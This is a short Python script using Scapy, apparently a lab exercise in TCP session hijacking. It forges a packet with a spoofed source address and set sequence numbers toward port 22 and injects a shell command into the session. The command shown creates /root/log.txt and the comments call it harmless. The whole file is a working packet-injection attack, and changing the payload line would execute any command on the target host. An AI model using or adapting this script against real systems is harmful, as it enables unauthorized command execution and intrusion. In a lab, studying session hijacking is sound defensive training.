#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.11.2.5", dst="10.2.11.6")
tcp = TCP(sport=42420, dport=22, flags="PA", seq=636491331, ack=17698764)

### Add 1 line here to inject the payload. 
### inject a harmless command that creates a new file, for example, log.txt in node2’s /root directory.

data = b"touch /root/log.txt\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
